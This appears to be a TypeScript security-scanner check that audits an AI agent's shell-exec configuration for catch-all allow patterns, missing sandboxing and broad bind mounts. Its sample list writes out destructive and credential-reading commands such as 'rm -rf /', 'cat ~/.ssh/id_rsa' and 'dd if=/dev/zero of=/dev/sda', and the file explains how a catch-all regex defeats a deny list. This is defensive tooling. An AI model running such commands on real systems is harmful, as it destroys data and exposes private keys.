import type { Evidence } from '../../core/types.js';
import { defineCheck } from '../../core/check-builder.js';
import { regexBudget, type RegexBudget } from '../../analyzers/bounded-regex.js';
import { compileForeignRegex, judgeCatchAlls, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
import { asRecord, asStringArray, getPath, nanobotConfigs, pick, pyBool } from './shared.js';

// allowPatterns are re.fullmatch()ed against each shell segment and take
// priority over denyPatterns — including the built-in deny list (rm -rf,
// mkfs, dd if=, shutdown, fork bomb, …) — so a catch-all disables it. Any
// regex spelling can be a catch-all ((?i).*, .{0,}, (.|\n)*, [^\x00]*), so
// patterns are judged by what they match, not by their text.
// shortest first: a pattern that misses one is told apart early (testSamples)
const DANGEROUS_SAMPLES = [
  'rm -rf /',
  'shutdown -h now',
  'cat ~/.ssh/id_rsa',
  'mkfs.ext4 /dev/sda1',
  'dd if=/dev/zero of=/dev/sda',
  'curl http://x.example/a.sh -o /tmp/a.sh',
];

/** Compile a Python `re` pattern for fullmatch semantics, Python-only syntax
 *  translated (foreign-regex.ts); undefined when it can't be run here. The
 *  pattern comes from config: run it with `testSamples`, never `re.test`. */
export function compilePyFullmatch(pattern: string): RegExp | undefined {
  const c = compileForeignRegex(pattern, 'python', { fullmatch: true });
  return c.kind === 'ok' ? c.re : undefined;
}

/**
 * Per allow pattern: `catch-all` when it fullmatches every sample dangerous
 * command, why it is not evaluated (timeout, the check's regex budget spent,
 * syntax VASO can't run), undefined otherwise — a pattern Python rejects
 * included (Nanobot raises on it and allows nothing). Patterns are used as
 * written: Nanobot doesn't strip them.
 */
export function judgeAllowPatterns(patterns: readonly string[], budget?: RegexBudget): Array<'catch-all' | NotEvaluated | undefined> {
  return judgeCatchAlls(patterns, 'python', DANGEROUS_SAMPLES, { fullmatch: true, budget });
}

/** `judgeAllowPatterns` for one pattern. */
export function judgeAllowPattern(pattern: string, budget?: RegexBudget): 'catch-all' | NotEvaluated | undefined {
  return judgeAllowPatterns([pattern], budget)[0];
}

/** An allow pattern that fullmatches every sample dangerous command. */
export function isCatchAllPattern(pattern: string): boolean {
  return judgeAllowPattern(pattern) === 'catch-all';
}

const SANDBOXES = new Set(['bwrap', 'seatbelt']);

// Bind roots that hand the sandboxed command the whole host or home dir.
function broadBind(path: string): boolean {
  const p = path.trim().replace(/\/+$/, '');
  return p === '' || p === '/' || p === '~' || p === '$HOME' || p === '${HOME}'
    || /^\/(?:home|Users|root|etc)$/.test(p) || /^\/(?:home|Users)\/[^/]+$/.test(p);
}

export const nb004 = defineCheck({
  id: 'NB-004',
  name: 'Shell Exec Tool Unconfined',
  category: 'nanobot',
  severity: 'warning',
  description: 'Check the shell exec tool (tools.exec, enabled by default): a catch-all allowPatterns entry disables the built-in deny list entirely (critical); without tools.exec.sandbox ("bwrap" on Linux, "seatbelt" on macOS) commands run with the user\'s full privileges and can read config.json secrets; broad sandbox bind mounts defeat the sandbox.',
  supportedAgents: ['nanobot'],

  async run(ctx, h) {
    const evidence: Evidence[] = [];
    let critical = false;
    const budget = regexBudget();

    for (const config of nanobotConfigs(ctx.configs)) {
      const exec = asRecord(getPath(config.data, 'tools.exec'));
      if (pyBool(exec?.enable) === false) continue;

      const unjudged: string[] = [];
      const patterns = asStringArray(pick(exec, 'allowPatterns'));
      const verdicts = judgeAllowPatterns(patterns, budget);
      for (const [k, pattern] of patterns.entries()) {
        const verdict = verdicts[k];
        if (verdict === 'budget') {
          unjudged.push(pattern);
          continue;
        }
        if (verdict === 'timeout' || verdict === 'unsupported') {
          evidence.push({
            file: config.filePath,
            snippet: `tools.exec.allowPatterns: ${JSON.stringify(pattern)}`,
            detail: notEvaluatedDetail(verdict, 'exempts dangerous commands from the deny list'),
          });
          continue;
        }
        if (verdict !== 'catch-all') continue;
        critical = true;
        evidence.push({
          file: config.filePath,
          snippet: `tools.exec.allowPatterns: ${JSON.stringify(pattern)}`,
          detail: 'Catch-all allow pattern matches every command, so neither denyPatterns nor the built-in deny list (rm -rf, mkfs, dd, shutdown, …) is ever applied',
        });
      }
      if (unjudged.length > 0) {
        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.allowPatterns', unjudged, 'exempts dangerous commands from the deny list'));
      }

      const sandbox = pick(exec, 'sandbox');
      if (typeof sandbox !== 'string' || !SANDBOXES.has(sandbox.trim())) {
        evidence.push({
          file: config.filePath,
          snippet: `tools.exec.sandbox: ${JSON.stringify(sandbox ?? '')}`,
          detail: 'Shell commands run unsandboxed with the user\'s full privileges — the deny list is a best-effort regex filter, not a boundary',
        });
      } else {
        const binds = [
          ...asStringArray(pick(exec, 'sandboxRwBinds')).map(b => ({ b, rw: true })),
          ...asStringArray(pick(exec, 'sandboxRoBinds')).map(b => ({ b, rw: false })),
        ];
        for (const { b, rw } of binds) {
          if (!broadBind(b)) continue;
          evidence.push({
            file: config.filePath,
            snippet: `tools.exec.sandbox${rw ? 'Rw' : 'Ro'}Binds: ${JSON.stringify(b)}`,
            detail: `Sandbox ${rw ? 'read-write' : 'read-only'} bind of "${b}" exposes the home directory or host to sandboxed commands`,
          });
        }
      }
    }

    return h.fromEvidence(evidence, {
      passed: 'Shell exec tool is disabled or sandboxed',
      failed: (n) => `${n} shell exec confinement issue(s)`,
      severity: critical ? 'critical' : undefined,
      fixDescription: 'Remove catch-all entries from tools.exec.allowPatterns; set tools.exec.sandbox to "bwrap" (Linux, requires bubblewrap) or "seatbelt" (macOS), keep sandbox binds narrow — or set tools.exec.enable to false if shell access is not needed',
    });
  },
});
